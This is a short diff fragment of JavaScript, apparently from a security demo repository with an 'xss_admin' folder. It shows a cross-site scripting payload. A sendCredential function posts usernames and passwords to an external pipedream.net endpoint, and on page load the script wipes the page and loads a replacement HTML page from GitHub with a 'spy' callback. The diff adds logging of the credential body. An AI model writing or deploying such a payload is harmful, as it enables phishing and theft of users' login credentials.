@@ -23,7 +23,7 @@ function sendCredential(username, password) {
         mode: "cors",
         body: JSON.stringify(body),
     };
-
+    console.log(body);
     fetch("https://ensnocsamq9t9ho.m.pipedream.net", options).then((function(response) {
         console.log(response);
     }));
@@ -34,8 +34,6 @@ $(window).on('load', function() {
     // Remove all unwanted content
     $(".row").remove();
     $('.place_holder').load("https://raw.githubusercontent.com/hotMS/Contoso-Stake/master/SkateShop/xss_admin/xss.html", spy);
-
-    console.log("done");
 });
 
 
